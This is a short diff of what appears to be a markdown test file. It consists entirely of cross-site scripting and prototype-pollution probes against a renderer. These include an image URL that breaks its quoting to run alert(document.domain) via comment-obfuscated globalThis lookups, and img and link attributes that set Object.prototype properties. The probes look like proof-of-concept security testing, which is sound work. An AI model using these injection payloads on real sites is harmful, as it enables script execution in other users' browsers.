@@ -1,4 +1,4 @@
 ![](../../../../../../../img/onload/../../r89shi/r89shi.github.io/blob/master/teste.js?w=10';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//)
 
-<img src=";Object.prototype.hif=['alert(document.domain)'];">
-<a href="Object.prototype.hif=['alert(document.domain)'];">aaa</a>
+<img src="Object.prototype.onload = 'alert(1)';">
+<a href="Object.prototype.onload = 'alert(1)';">aaa</a>
